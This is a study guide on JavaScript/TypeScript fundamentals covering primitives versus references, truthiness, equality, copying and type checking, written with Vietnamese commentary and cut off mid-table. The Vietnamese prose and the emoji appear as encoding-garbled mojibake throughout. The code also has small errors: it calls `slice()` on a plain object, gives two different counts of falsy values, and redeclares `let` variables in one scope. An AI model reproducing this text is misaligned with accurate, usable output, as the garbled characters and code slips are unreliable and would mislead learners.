# ğŸ“š Frontend Core Fundamentals

> **Táº¥t cáº£ examples Ä‘Æ°á»£c viáº¿t báº±ng TypeScript vá»›i chÃº thÃ­ch tiáº¿ng Viá»‡t chi tiáº¿t** > **Highlight cÃ¡c ná»™i dung quan trá»ng Ä‘á»ƒ dá»… hiá»ƒu vÃ  nhá»› lÃ¢u**
> Pháº§n sumary sáº½ tÃ³m táº¯t láº¡i ná»™i dung cá»§a cÃ¢u há»i


## **Pháº§n 1: Data Types & Memory Management**


<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸš© Q1: Primitive vs Reference Values - GiÃ¡ Trá»‹ NguyÃªn Thá»§y vs Tham Chiáº¿u</span></summary>


**âš¡ Quick Summary:**
> **Primitive** = LÆ°u giÃ¡ trá»‹ trá»±c tiáº¿p (stack), copy = táº¡o báº£n sao má»›i  
> **Reference** = LÆ°u Ä‘á»‹a chá»‰ (stack) + data (heap), copy = share cÃ¹ng Ä‘á»‹a chá»‰

**ğŸ’¡ Ghi Nhá»›:**
- ğŸ”¢ **7 Primitive**: number, string, boolean, undefined, null, symbol, bigint
- ğŸ“¦ **1 Reference**: object (bao gá»“m: array, function, date, map, set...)
- ğŸ¯ **Rule**: Primitive = "copy giÃ¡ trá»‹", Reference = "copy Ä‘á»‹a chá»‰"

**Tráº£ lá»i:

- **ğŸ”¥ Primitive Values (GiÃ¡ trá»‹ nguyÃªn thá»§y)**: LÃ  cÃ¡c giÃ¡ trá»‹ cÆ¡ báº£n Ä‘Æ°á»£c lÆ°u trá»¯ trá»±c tiáº¿p trong memory stack (lÆ°u trá»±c tiáº¿p trong ngÄƒn xáº¿p bá»™ nhá»›)
- **ğŸ¯ Reference Values (GiÃ¡ trá»‹ tham chiáº¿u)**: LÃ  cÃ¡c object Ä‘Æ°á»£c lÆ°u trá»¯ trong heap, chá»‰ cÃ³ Ä‘á»‹a chá»‰ Ä‘Æ°á»£c lÆ°u trong stack (Ä‘á»‘i tÆ°á»£ng lÆ°u trong heap, chá»‰ Ä‘á»‹a chá»‰ trong stack)
- **âœ… Æ¯u Ä‘iá»ƒm Primitive**: Nhanh hÆ¡n, an toÃ n hÆ¡n, khÃ´ng cÃ³ side effects (khÃ´ng cÃ³ tÃ¡c dá»¥ng phá»¥)
- **âš ï¸ NhÆ°á»£c Ä‘iá»ƒm Reference**: CÃ³ thá»ƒ gÃ¢y memory leak, thay Ä‘á»•i khÃ´ng mong muá»‘n khi copy (cÃ³ thá»ƒ gÃ¢y rÃ² rá»‰ bá»™ nhá»›)

**Code Example:**

```typescript
// ğŸ”¥ Primitive Values (GiÃ¡ trá»‹ nguyÃªn thá»§y) - lÆ°u trá»±c tiáº¿p giÃ¡ trá»‹
let name: string = 'Nguyen Van A'; // string - chuá»—i
let age: number = 25; // number - sá»‘
let isActive: boolean = true; // boolean - true/false
let data: null = null; // null - rá»—ng
let info: undefined = undefined; // undefined - chÆ°a Ä‘á»‹nh nghÄ©a
let id: symbol = Symbol('id'); // symbol - duy nháº¥t
let bigNum: bigint = 123n; // bigint - sá»‘ nguyÃªn lá»›n

// ğŸ¯ Reference Values (GiÃ¡ trá»‹ tham chiáº¿u) - lÆ°u Ä‘á»‹a chá»‰ trong stack, data trong heap
let person: object = { name: 'A', age: 25 }; // object - Ä‘á»‘i tÆ°á»£ng
let numbers: number[] = [1, 2, 3]; // array - máº£ng
let func: Function = () => console.log('Hi'); // function - hÃ m

// ğŸ”¥ So sÃ¡nh Primitive vs Reference (So sÃ¡nh giÃ¡ trá»‹ nguyÃªn thá»§y vs tham chiáº¿u)
let a: number = 10;
let b: number = a; // b = 10 (copy giÃ¡ trá»‹ - sao chÃ©p giÃ¡ trá»‹)
b = 20; // a váº«n = 10, b = 20 (a khÃ´ng bá»‹ áº£nh hÆ°á»Ÿng)

let obj1: object = { x: 10 };
let obj2: object = obj1; // obj2 trá» Ä‘áº¿n cÃ¹ng Ä‘á»‹a chá»‰ vá»›i obj1 (cÃ¹ng tham chiáº¿u)
obj2.x = 20; // obj1.x cÅ©ng = 20 (cÃ¹ng reference - cáº£ hai thay Ä‘á»•i)

// ğŸ¯ Practical Example (VÃ­ dá»¥ thá»±c táº¿)
// Primitive - an toÃ n
let userName = 'John';
let displayName = userName; // Copy giÃ¡ trá»‹
displayName = 'Jane';
console.log(userName); // "John" - khÃ´ng thay Ä‘á»•i
console.log(displayName); // "Jane" - chá»‰ displayName thay Ä‘á»•i

// Reference - cáº§n cáº©n tháº­n
let user = { name: 'John', age: 25 }; // khá»Ÿi táº¡o object
let userCopy = user; // Copy Ä‘á»‹a chá»‰ object
userCopy.name = 'Jane';
console.log(user.name); // "Jane" - user bá»‹ thay Ä‘á»•i!
console.log(userCopy.name); // "Jane" - cáº£ hai cÃ¹ng thay Ä‘á»•i
```

**ğŸ¯ Best Practices:**

- **âœ… Sá»­ dá»¥ng primitive values** khi cÃ³ thá»ƒ Ä‘á»ƒ trÃ¡nh side effects
- **âœ… Cáº©n tháº­n vá»›i reference values** khi pass vÃ o functions - cÃ³ thá»ƒ bá»‹ thay Ä‘á»•i
- **âœ… Sá»­ dá»¥ng const cho reference values** Ä‘á»ƒ trÃ¡nh reassignment (trÃ¡nh gÃ¡n láº¡i)
- **âœ… Sá»­ dá»¥ng spread operator** Ä‘á»ƒ shallow copy: `{...obj}`, `[...array]`
- **âœ… Sá»­ dá»¥ng deep copy** cho nested objects: `JSON.parse(JSON.stringify(obj))`

**âŒ Common Mistakes:**

```typescript
// âŒ Sai: KhÃ´ng hiá»ƒu reference copy (khÃ´ng hiá»ƒu sao chÃ©p tham chiáº¿u)
let arr1 = [1, 2, 3];
let arr2 = arr1; // Copy Ä‘á»‹a chá»‰, khÃ´ng pháº£i giÃ¡ trá»‹
arr2.push(4); // arr1 cÅ©ng bá»‹ thay Ä‘á»•i!

// âœ… ÄÃºng: Táº¡o copy má»›i (táº¡o báº£n sao má»›i)
let arr1 = [1, 2, 3];
let arr2 = [...arr1]; // shallow copy (sao chÃ©p nÃ´ng)
arr2.push(4); // arr1 khÃ´ng bá»‹ áº£nh hÆ°á»Ÿng

// âŒ Sai: So sÃ¡nh reference values (so sÃ¡nh giÃ¡ trá»‹ tham chiáº¿u)
let obj1 = { name: 'John' };
let obj2 = { name: 'John' };
console.log(obj1 === obj2); // false - khÃ¡c Ä‘á»‹a chá»‰

// âœ… ÄÃºng: So sÃ¡nh ná»™i dung (so sÃ¡nh ná»™i dung)
console.log(JSON.stringify(obj1) === JSON.stringify(obj2)); // true

// âŒ Sai: Thay Ä‘á»•i object gá»‘c (thay Ä‘á»•i Ä‘á»‘i tÆ°á»£ng gá»‘c)
function updateUser(user: any) {
  user.name = 'Updated'; // Thay Ä‘á»•i object gá»‘c
}

// âœ… ÄÃºng: Táº¡o object má»›i (táº¡o Ä‘á»‘i tÆ°á»£ng má»›i)
function updateUser(user: any) {
  return { ...user, name: 'Updated' }; // Tráº£ vá» object má»›i
}
```

</details>

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸ’¡ Q2: Falsy/Truthy Values</span></summary>


**âš¡ Quick Summary:**
> Falsy: false, 0, '', null, undefined, NaN. Truthy = cÃ²n láº¡i

**ğŸ’¡ Ghi Nhá»›:**
- âŒ **6 Falsy**: false, 0, '', null, undefined, NaN
- âœ… **Truthy**: Táº¥t cáº£ cÃ²n láº¡i ([], {}, '0', 'false'...)
- âš ï¸ **Trap**: `[]` vÃ  `{}` lÃ  truthy!

**Tráº£ lá»i:**

```typescript
// 8 Falsy Values
console.log(Boolean(false)); // false
console.log(Boolean(0)); // false
console.log(Boolean(-0)); // false
console.log(Boolean(0n)); // false (BigInt)
console.log(Boolean('')); // false (empty string)
console.log(Boolean(null)); // false
console.log(Boolean(undefined)); // false
console.log(Boolean(NaN)); // false

// Truthy Values (táº¥t cáº£ cÃ²n láº¡i)
console.log(Boolean([])); // true (empty array)
console.log(Boolean({})); // true (empty object)
console.log(Boolean('0')); // true (string)
console.log(Boolean('false')); // true (string)

// Practical usage
const numbers = [0, 1, 2, 3];
const truthyNumbers = numbers.filter(Boolean); // [1, 2, 3]

function greet(name?: string) {
  return name ? `Hello ${name}` : 'Hello Guest';
}
```

</details>

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸ” Q3: == vs === (Type Coercion)</span></summary>


**âš¡ Quick Summary:**
> `==` coerce types, `===` khÃ´ng coerce. LuÃ´n dÃ¹ng `===`

**ğŸ’¡ Ghi Nhá»›:**
- ğŸ¯ **===**: Strict equality - khÃ´ng convert type
- âš ï¸ **==**: Loose equality - convert type trÆ°á»›c khi so sÃ¡nh
- ğŸ“Œ **Rule**: LuÃ´n dÃ¹ng `===` trá»« khi check `== null`

**Tráº£ lá»i:**

```typescript
// == vs === Examples
console.log(5 == '5'); // true (type coercion)
console.log(5 === '5'); // false (no type coercion)

console.log(0 == false); // true
console.log(0 === false); // false

console.log(null == undefined); // true (special case)
console.log(null === undefined); // false

// Best practice: DÃ¹ng === máº·c Ä‘á»‹nh
if (user.age === 25) { /* RÃµ rÃ ng */ }

// Exception: Check cáº£ null vÃ  undefined
if (value == null) { /* Check both null and undefined */ }
```

</details>

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸ§© Q4: null vs undefined</span></summary>


**âš¡ Quick Summary:**
> `null` = intentionally empty. `undefined` = chÆ°a Ä‘Æ°á»£c gÃ¡n giÃ¡ trá»‹

**ğŸ’¡ Ghi Nhá»›:**
- ğŸ¯ **null**: Láº­p trÃ¬nh viÃªn set = empty cÃ³ chá»§ Ä‘Ã­ch
- â“ **undefined**: Biáº¿n chÆ°a Ä‘Æ°á»£c gÃ¡n, hoáº·c function khÃ´ng return
- âš¡ **Check**: `value == null` check cáº£ null vÃ  undefined

**Tráº£ lá»i:**

```typescript
// null - intentional absence
let user: User | null = null; // Explicitly empty
function findUser(id: number): User | null {
  return null; // User not found
}

// undefined - unintentional absence
let age: number; // undefined (uninitialized)
function getProperty(obj: any, key: string) {
  return obj[key]; // undefined if key doesn't exist
}

console.log(typeof null); // "object" (historical bug)
console.log(typeof undefined); // "undefined"

// Nullish coalescing
const name = user?.name ?? 'Guest'; // Only null/undefined â†’ 'Guest'
const theme = settings?.theme ?? 'light';
```

</details>

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸ”— Q5: || && ?? vÃ  Optional Chaining</span></summary>


**âš¡ Quick Summary:**
> `||` = OR, `&&` = AND, `??` = nullish coalescing (chá»‰ null/undefined). `?.` = optional chaining

**ğŸ’¡ Ghi Nhá»›:**
- ğŸ¯ **??**: Chá»‰ check null/undefined (khÃ¡c || check falsy)
- ğŸ”— **?.**: Safe navigation - `obj?.prop?.method?.()`
- âš ï¸ **Trap**: `0 ?? 1` = 0, nhÆ°ng `0 || 1` = 1

**Tráº£ lá»i:**

```typescript
// || vs ?? (KHÃC BIá»†T)
const age1 = 0 || 18; // 18 (0 is falsy)
const age2 = 0 ?? 18; // 0 (0 is not nullish)

const name1 = '' || 'Guest'; // 'Guest' ('' is falsy)
const name2 = '' ?? 'Guest'; // '' ('' is not nullish)

// Optional chaining
const city = user?.address?.city; // Safe navigation
const result = user?.getName?.(); // Safe method call
const item = items?.[0]; // Safe array access

// Best practices
const theme = settings?.theme ?? 'light'; // DÃ¹ng ?? cho default
const count = items?.length ?? 0; // Safe vá»›i nullish coalescing
const hasEmail = user?.contact?.email && true; // && cho conditional
```

</details>

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸ”’ Q6: Immutable vs Mutable</span></summary>


**âš¡ Quick Summary:**
> **Mutable** = CÃ³ thá»ƒ sá»­a trá»±c tiáº¿p  
> **Immutable** = KhÃ´ng sá»­a Ä‘Æ°á»£c, pháº£i táº¡o má»›i

**ğŸ’¡ Ghi Nhá»›:**
- ğŸ”’ **Immutable**: string, number, boolean, null, undefined, symbol, bigint (primitives)
- ğŸ”“ **Mutable**: object, array, function, date, map, set (references)
- ğŸ¯ **Rule**: Primitive = immutable, Reference = mutable

**Tráº£ lá»i:**

- **Immutable**: KhÃ´ng thá»ƒ thay Ä‘á»•i sau khi táº¡o, táº¡o ra giÃ¡ trá»‹ má»›i khi modify
- **Mutable**: CÃ³ thá»ƒ thay Ä‘á»•i trá»±c tiáº¿p giÃ¡ trá»‹ hiá»‡n táº¡i
- **Æ¯u Ä‘iá»ƒm**: Immutable an toÃ n hÆ¡n, dá»… debug, trÃ¡nh side effects
- **NhÆ°á»£c Ä‘iá»ƒm**: Immutable tá»‘n memory hÆ¡n, performance cháº­m hÆ¡n

**Code Example:**

```typescript
// Mutable - cÃ³ thá»ƒ thay Ä‘á»•i trá»±c tiáº¿p
let mutableArray: number[] = [1, 2, 3];
mutableArray.push(4); // Thay Ä‘á»•i array gá»‘c
mutableArray[0] = 10; // Thay Ä‘á»•i pháº§n tá»­

let mutableObject: { name: string; age: number } = { name: 'A', age: 25 };
mutableObject.age = 26; // Thay Ä‘á»•i object gá»‘c

// Immutable - táº¡o giÃ¡ trá»‹ má»›i
let immutableArray: readonly number[] = [1, 2, 3] as const;
// immutableArray.push(4);   // âŒ Error: Cannot modify readonly array

// Táº¡o array má»›i thay vÃ¬ modify
let newArray: number[] = [...immutableArray, 4]; // [1, 2, 3, 4]
let updatedArray: number[] = immutableArray.map((x) => x * 2); // [2, 4, 6]

// Immutable object vá»›i spread operator
let immutableObj: { name: string; age: number } = { name: 'A', age: 25 };
let newObj: { name: string; age: number } = { ...immutableObj, age: 26 };
```

**Best Practices:**

- Sá»­ dá»¥ng `readonly` cho arrays vÃ  objects khi cÃ³ thá»ƒ
- Sá»­ dá»¥ng spread operator Ä‘á»ƒ táº¡o copy
- Sá»­ dá»¥ng `Object.freeze()` Ä‘á»ƒ lÃ m immutable object
- Sá»­ dá»¥ng libraries nhÆ° Immer cho complex immutable operations

**Mistakes:**

```typescript
// âŒ Sai: Modify trá»±c tiáº¿p
let users = [{ name: 'A', age: 25 }];
users[0].age = 26; // Modify trá»±c tiáº¿p

// âœ… ÄÃºng: Táº¡o object má»›i
let users = [{ name: 'A', age: 25 }];
let updatedUsers = users.map((user) =>
  user.name === 'A' ? { ...user, age: 26 } : user
);
```

</details>

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸ“¦ Q7: Deep Copy vs Shallow Copy</span></summary>


**âš¡ Quick Summary:**
> **Shallow Copy** = Copy level Ä‘áº§u tiÃªn, nested object váº«n share reference  
> **Deep Copy** = Copy toÃ n bá»™, nested object cÅ©ng Ä‘Æ°á»£c copy

**ğŸ’¡ Ghi Nhá»›:**
- ğŸ“ **Shallow**: `{...obj}`, `[...arr]`, `Object.assign()` - chá»‰ copy 1 táº§ng
- ğŸ” **Deep**: `JSON.parse(JSON.stringify())`, `structuredClone()`, libraries
- âš ï¸ **Trap**: Shallow copy nested object â†’ váº«n share reference!

**Tráº£ lá»i:**

- **Shallow Copy**: Copy cáº¥p Ä‘áº§u tiÃªn, nested objects váº«n share reference
- **Deep Copy**: Copy toÃ n bá»™, táº¡o ra object hoÃ n toÃ n má»›i
- **Æ¯u Ä‘iá»ƒm**: Deep copy an toÃ n hÆ¡n, shallow copy nhanh hÆ¡n
- **NhÆ°á»£c Ä‘iá»ƒm**: Deep copy tá»‘n memory vÃ  thá»i gian hÆ¡n

**Code Example:**

```typescript
// Shallow Copy - chá»‰ copy cáº¥p Ä‘áº§u
let original: { name: string; address: { city: string } } = {
  name: 'Nguyen Van A',
  address: { city: 'Ho Chi Minh' },
};

// CÃ¡c cÃ¡ch shallow copy
let shallow1 = { ...original }; // Spread operator
let shallow2 = Object.assign({}, original); // Object.assign
let shallow3 = original.slice(); // Array slice (cho arrays)

// Váº¥n Ä‘á» vá»›i shallow copy
shallow1.name = 'Nguyen Van B'; // âœ… OK - primitive
shallow1.address.city = 'Ha Noi'; // âŒ áº¢nh hÆ°á»Ÿng original!

console.log(original.address.city); // "Ha Noi" - bá»‹ thay Ä‘á»•i!

// Deep Copy - copy toÃ n bá»™
function deepCopy<T>(obj: T): T {
  if (obj === null || typeof obj !== 'object') return obj;
  if (obj instanceof Date) return new Date(obj.getTime()) as any;
  if (obj instanceof Array) return obj.map((item) => deepCopy(item)) as any;
  if (typeof obj === 'object') {
    const copy: any = {};
    Object.keys(obj).forEach((key) => {
      copy[key] = deepCopy((obj as any)[key]);
    });
    return copy;
  }
  return obj;
}

let deepCopied = deepCopy(original);
deepCopied.address.city = 'Da Nang'; // âœ… KhÃ´ng áº£nh hÆ°á»Ÿng original
console.log(original.address.city); // "Ho Chi Minh" - khÃ´ng Ä‘á»•i

// Sá»­ dá»¥ng JSON (cÃ³ háº¡n cháº¿)
let jsonDeepCopy = JSON.parse(JSON.stringify(original));
// âŒ Máº¥t functions, undefined, symbols, dates
```

**Best Practices:**

- Sá»­ dá»¥ng shallow copy cho simple objects
- Sá»­ dá»¥ng deep copy cho nested objects
- Sá»­ dá»¥ng `structuredClone()` (modern browsers)
- Sá»­ dá»¥ng libraries nhÆ° Lodash `cloneDeep()`

**Mistakes:**

```typescript
// âŒ Sai: NghÄ© spread operator lÃ  deep copy
let obj = { a: { b: 1 } };
let copy = { ...obj };
copy.a.b = 2; // obj.a.b cÅ©ng = 2!

// âœ… ÄÃºng: Sá»­ dá»¥ng deep copy
let copy = structuredClone(obj); // hoáº·c custom deep copy function
```

</details>

<details>
<summary><span style="font-size:1.25em;font-weight:bold;">ğŸ§ª Q8: Type Checking - Kiá»ƒm Tra Kiá»ƒu Dá»¯ Liá»‡u</span></summary>


**âš¡ Quick Summary:**
> `typeof` nhanh nhÆ°ng cÃ³ bugs (null, array). DÃ¹ng `Object.prototype.toString.call()` cho chÃ­nh xÃ¡c 100%

**ğŸ’¡ Ghi Nhá»›:**
- âš¡ **typeof**: Nhanh, nhÆ°ng `typeof null === 'object'` âŒ, `typeof [] === 'object'` âŒ
- âœ… **Array.isArray()**: Best cho array check
- ğŸ¯ **Number.isNaN()**: KhÃ´ng coerce (khÃ¡c vá»›i `isNaN()`)
- ğŸ“¦ **Object.prototype.toString.call()**: ChÃ­nh xÃ¡c nháº¥t cho má»i type

**Tráº£ lá»i:**

- **KhÃ¡i niá»‡m**: JavaScript cÃ³ **7 primitive types** (number, string, boolean, undefined, null, symbol, bigint) vÃ  **1 complex type** (object). Kiá»ƒm tra Ä‘Ãºng type lÃ  critical Ä‘á»ƒ trÃ¡nh bugs.
- **Váº¥n Ä‘á» vá»›i `typeof`**: KhÃ´ng chÃ­nh xÃ¡c 100% (typeof null === 'object', typeof [] === 'object', typeof NaN === 'number')
- **Ká»¹ thuáº­t nÃ¢ng cao**: `Object.prototype.toString.call()`, `Array.isArray()`, `instanceof`, Custom type guards
- **Æ¯u Ä‘iá»ƒm**: TrÃ¡nh runtime errors, type-safe code, dá»… debug
- **NhÆ°á»£c Ä‘iá»ƒm**: Cáº§n biáº¿t edge cases cá»§a `typeof`, `instanceof` khÃ´ng work vá»›i primitives

**Táº¥t Cáº£ Kiá»ƒu Dá»¯ Liá»‡u Trong JavaScript:**

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚                   JAVASCRIPT DATA TYPES                      â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚                                                              â”‚
â”‚  ğŸ”¹ PRIMITIVE TYPES (7 loáº¡i - Immutable)                    â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
â”‚  â”‚ 1. number      â†’ 42, 3.14, NaN, Infinity             â”‚  â”‚
â”‚  â”‚ 2. string      â†’ "hello", 'world', \`template\`      â”‚  â”‚
â”‚  â”‚ 3. boolean     â†’ true, false                         â”‚  â”‚
â”‚  â”‚ 4. undefined   â†’ undefined (chÆ°a gÃ¡n giÃ¡ trá»‹)        â”‚  â”‚
â”‚  â”‚ 5. null        â†’ null (intentionally empty)          â”‚  â”‚
â”‚  â”‚ 6. symbol      â†’ Symbol('id') (unique identifier)    â”‚  â”‚
â”‚  â”‚ 7. bigint      â†’ 123456789n (sá»‘ lá»›n hÆ¡n 2^53-1)     â”‚  â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
â”‚                                                              â”‚
â”‚  ğŸ”¸ COMPLEX TYPE (1 loáº¡i - Mutable)                         â”‚
â”‚  â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”  â”‚
â”‚  â”‚ 8. object      â†’ {}, [], new Date(), new Map(), ...  â”‚  â”‚
â”‚  â”‚                                                       â”‚  â”‚
â”‚  â”‚    Subtypes:                                         â”‚  â”‚
â”‚  â”‚    â€¢ Plain Object    â†’ { name: "John" }             â”‚  â”‚
â”‚  â”‚    â€¢ Array           â†’ [1, 2, 3]                    â”‚  â”‚
â”‚  â”‚    â€¢ Function        â†’ function() {}                â”‚  â”‚
â”‚  â”‚    â€¢ Date            â†’ new Date()                   â”‚  â”‚
â”‚  â”‚    â€¢ RegExp          â†’ /abc/g                       â”‚  â”‚
â”‚  â”‚    â€¢ Map/Set         â†’ new Map(), new Set()         â”‚  â”‚
â”‚  â”‚    â€¢ Error           â†’ new Error()                  â”‚  â”‚
â”‚  â”‚    â€¢ Promise         â†’ new Promise()                â”‚  â”‚
â”‚  â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜  â”‚
â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜
```

**Code Examples:**

```typescript
// 1. TYPEOF - Fast but cÃ³ bugs
typeof 42 // 'number'
typeof 'hi' // 'string'
typeof true // 'boolean'
typeof null // 'object' âš ï¸ BUG!
typeof [] // 'object' âš ï¸ khÃ´ng phÃ¢n biá»‡t array
typeof NaN // 'number' âš ï¸
typeof function(){} // 'function' âœ…

// 2. Object.prototype.toString.call() - CHÃNH XÃC NHáº¤T
Object.prototype.toString.call(null) // '[object Null]' âœ…
Object.prototype.toString.call([]) // '[object Array]' âœ…
Object.prototype.toString.call(new Date()) // '[object Date]'

// 3. Helper function
function getType(v: any): string {
  return Object.prototype.toString.call(v).slice(8, -1).toLowerCase();
}
getType(null) // 'null' âœ…
getType([]) // 'array' âœ…
getType(NaN) // 'number'

// 4. Specific checks
Array.isArray([]) // true âœ… Best cho array
Number.isNaN(NaN) // true âœ… KhÃ´ng coerce (isNaN('hi') = true âŒ)
Number.isFinite(42) // true âœ…
Number.isInteger(42) // true
value === null // âœ… Strict check
value == null // âœ… Check cáº£ null VÃ€ undefined

// 5. instanceof - Check prototype chain
class Person {}
const p = new Person()
p instanceof Person // true
[] instanceof Array // true
{} instanceof Object // true

// âš ï¸ instanceof KHÃ”NG work vá»›i primitives:
'hi' instanceof String // false
42 instanceof Number // false

// 6. Safe conversion helpers
function safeNumber(v: any, def = 0): number {
  if (typeof v === 'number' && !isNaN(v)) return v;
  const n = Number(v);
  return !isNaN(n) ? n : def;
}

function safeBoolean(v: any, def = false): boolean {
  if (typeof v === 'boolean') return v;
  if (typeof v === 'string') {
    const s = v.toLowerCase();
    if (['true','1','yes'].includes(s)) return true;
    if (['false','0','no',''].includes(s)) return false;
  }
  return def;
}

// Usage
safeNumber('123') // 123
safeNumber('abc') // 0
safeBoolean('yes') // true
safeBoolean('no') // false
```

**âœ… Summary:**
- `typeof`: Nhanh, dÃ¹ng cho primitives (trá»« null)
- `Object.prototype.toString.call()`: ChÃ­nh xÃ¡c nháº¥t
- `Array.isArray()`: Best cho array
- `Number.isNaN()`: Best cho NaN
- `instanceof`: DÃ¹ng cho objects (khÃ´ng dÃ¹ng cho primitives)


**Best Practices (Thá»±c HÃ nh Tá»‘t):**

1. **âœ… DÃ¹ng `Array.isArray()` Ä‘á»ƒ check array** (khÃ´ng dÃ¹ng `typeof`)
2. **âœ… DÃ¹ng `Number.isNaN()` thay vÃ¬ `isNaN()`** (khÃ´ng coerce)
3. **âœ… DÃ¹ng `Number.isFinite()` thay vÃ¬ `isFinite()`** (khÃ´ng coerce)
4. **âœ… DÃ¹ng `Object.prototype.toString.call()` cho chÃ­nh xÃ¡c nháº¥t**
5. **âœ… DÃ¹ng `===` thay vÃ¬ `==`** (strict equality)
6. **âœ… Táº¡o type guard functions** cho TypeScript type narrowing
7. **âœ… Check `null` vÃ  `undefined` vá»›i `== null`** (check cáº£ 2)

**Common Mistakes (Lá»—i ThÆ°á»ng Gáº·p):**

```typescript
// âŒ Lá»–I 1: DÃ¹ng typeof Ä‘á»ƒ check null
if (typeof value === 'null') { } // âŒ typeof null === 'object'

// âœ… ÄÃšNG: Check trá»±c tiáº¿p
if (value === null) { } // âœ…

// âŒ Lá»–I 2: DÃ¹ng typeof Ä‘á»ƒ check array
if (typeof arr === 'array') { } // âŒ typeof [] === 'object'

// âœ… ÄÃšNG: DÃ¹ng Array.isArray
if (Array.isArray(arr)) { } // âœ…

// âŒ Lá»–I 3: DÃ¹ng isNaN() thay vÃ¬ Number.isNaN()
console.log(isNaN('hello')); // true - âŒ Coerce thÃ nh NaN

// âœ… ÄÃšNG: DÃ¹ng Number.isNaN()
console.log(Number.isNaN('hello')); // false - âœ…

// âŒ Lá»–I 4: DÃ¹ng instanceof vá»›i primitives
console.log('hello' instanceof String); // false - âŒ

// âœ… ÄÃšNG: DÃ¹ng typeof
console.log(typeof 'hello' === 'string'); // true - âœ…

// âŒ Lá»–I 5: QuÃªn check NaN trong sá»‘
function isValidNumber(value: any): boolean {
  return typeof value === 'number'; // âŒ NaN pass qua!
}

// âœ… ÄÃšNG: Check cáº£ NaN
function isValidNumber(value: any): boolean {
  return typeof value === 'number' && !isNaN(value); // âœ…
}

// âŒ Lá»–I 6: Confuse null vá»›i undefined
let value = null;
console.log(typeof value === 'undefined'); // false - âŒ

// âœ… ÄÃšNG: Check Ä‘Ãºng type
console.log(value === null); // true - âœ…
console.log(value == null); // true - âœ… Check cáº£ null vÃ  undefined

// âŒ Lá»–I 7: Check plain object khÃ´ng Ä‘Ãºng
function isObject(value: any): boolean {
  return typeof value === 'object'; // âŒ null, array, date Ä‘á»u pass!
}

// âœ… ÄÃšNG: Check plain object
function isPlainObject(value: any): boolean {
  return Object.prototype.toString.call(value) === '[object Object]';
}
```

**ğŸ“Š So SÃ¡nh CÃ¡c PhÆ°Æ¡ng PhÃ¡p:**

```
â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”
â”‚ PhÆ°Æ¡ng PhÃ¡p                â”‚ Speed   â”‚ Accuracy â”‚ Primitives   â”‚ Objects      â”‚
â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤
â”‚ typeof                     â”‚ âš¡âš¡âš¡âš¡âš¡ â”‚ â­â­       â”‚ âœ… (trá»« null)â”‚ âŒ (all 'obj')â”‚
â”‚ instanceof                 â”‚ âš¡âš¡âš¡âš¡   â”‚ â­â­â­     â”‚ âŒ           â”‚ âœ…           â”‚
